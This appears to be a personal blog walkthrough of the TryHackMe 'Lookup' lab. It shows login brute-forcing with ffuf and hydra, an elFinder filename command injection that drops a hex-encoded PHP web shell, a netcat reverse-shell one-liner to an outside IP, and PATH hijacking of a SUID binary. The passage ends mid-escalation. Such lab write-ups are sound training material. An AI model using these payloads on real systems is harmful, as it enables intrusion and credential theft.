---
title: "TryHackMe: Lookup"
author: cilgin
date: 2025-06-27 17:59:47 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-21-TryHackMe-Lookup/main.png
---

Hi guys now i'm making <https://tryhackme.com/room/lookup> room.

---

## Nmap Scan

First things first, let's make our lives a little easier. I'm exporting the target IP to an environment variable so I don't have to type it a million times.

```bash
export IP=10.10.219.52
```

With our variable set, it's time to unleash `nmap`:

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-27 17:58 +0300
Nmap scan report for 10.10.219.52
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:86:69:de:5a:2b:d9:2d:e4:66:63:31:59:8c:b9:51 (RSA)
|   256 42:53:6f:97:c3:7d:bb:cc:a0:38:ed:4f:b2:73:28:32 (ECDSA)
|_  256 c4:44:35:6d:9b:51:ca:03:1b:42:0f:51:ac:34:fd:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.29 seconds
```

```bash
curl $IP
```

But there is not output so i go to my browser and type the ip adress

It seems to be this IP adress is routing me to <http://lookup.thm>. So i add this domain to the `/etc/hosts`

And i see the website

![Desktop View](/assets/img/2025-06-21-TryHackMe-Lookup/photo1.png){: width="972" height="589" }

And i tried password:password but it didnt worked of course.

and i tried fuzzing the server with `gobuster`

```bash
❯ gobuster dir -w common.txt -u http://lookup.thm/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              md,js,html,php,py,css,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 719]
/login.php            (Status: 200) [Size: 1]
/server-status        (Status: 403) [Size: 275]
/styles.css           (Status: 200) [Size: 687]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

There is login.php we can use brute force this webpage

If ı go the main page and try something I see username and password on http request

```text
admin=admin&password=admin
```

I guess the username is admin so we need to find the password.

I use `ffuf` to get the password.

```bash
❯ ffuf -w rockyou.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 8
________________________________________________

*************             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 75ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

We know the password now

If ı try that password to log in it didnt worked.

So maybe i need to fuzz the users too.

```bash
❯ ffuf -w xato_net_usernames.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=REDACTED' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 10

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/xato_net_usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Data             : username=FUZZ&password=REDACTED
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 10
________________________________________________

****                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 74ms]
```

I tried logging in with the credentials. And logged in but site routed me to files.lookup.thm
So i added the domain to the /etc/hosts

and ı finded some web file manager software.

![Desktop View](/assets/img/2025-06-21-TryHackMe-Lookup/photo2.png){: width="972" height="589" }

I firstly tried to check the software version for any vulns

And i finded this <https://www.exploit-db.com/exploits/46481>

But it is using python2 so i'm not gonna run that thing. Beacuse it is outdated.

So i look at the script and maked the things by manual.

1. Upload regular jpeg
2. Rename the file like this =

```bash
$(echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > shell.php).jpg
```

3. Rotate the image and click apply
4. You will get a error thats fine
5. Try commands like this

```bash
❯ curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Gaining Reverse Shell

I use <https://www.revshells.com/>

```bash
❯ curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
```

And gained shell.

```bash
www-data@ip-10-10-219-52:/home$ ls
ls
ssm-user
think
ubuntu
www-data@ip-10-10-219-52:/home$
```

I runned linpeas in the machine and finded a binary with suid.

```bash
www-data@ip-10-10-219-52:/usr/sbin$ ls -la pwm
-rwsr-sr-x 1 root root 17176 Jan 11  2024 pwm
www-data@ip-10-10-219-52:/usr/sbin$ ./pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

It is running id command probably without specifying the path.

We can try to abuse that.

```bash
www-data@ip-10-10-219-52:/usr/sbin$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
ssm-user:x:1001:1001::/home/ssm-user:/bin/sh
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bas
```

Think users guid is 1000 1000

```bash
export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin
```

```bash
echo -e '#!/bin/bash\necho "uid=1000(think) gid=1000(think) groups=33(www-data)"' > /tmp/id
chmod 777 /tmp/id
```

```bash
ww-data@ip-10-10-219-52:/tmp$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
...
jose.2856171
```

```bash
❯ hydra -l think -P password.txt ssh://lookup.thm
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-27 19:49:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://lookup.thm:22/
[22][ssh] host: lookup.thm   login: think   password: *************
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-27 19:49:34
```

This gave me ssh password sshed in

```bash
think@ip-10-10-219-52:~$ cat user.txt
**********************************
```

time for the ubuntu user

```bash
think@ip-10-10-219-52:/home$ ls -la
total 20
drwxr-xr-x  5 root     root     4096 Jun 27 14:58 .
drwxr-xr-x 19 root     root     4096 Jun 27 14:58 ..
drwxr-xr-x  2 ssm-user ssm-user 4096 May 28 19:20 ssm-user
drwxr-xr-x  5 think    think    4096 Jan 11  2024 think
drwxr-xr-x  3 ubuntu   ubuntu   4096 Jun 27 14:58 ubuntu
```
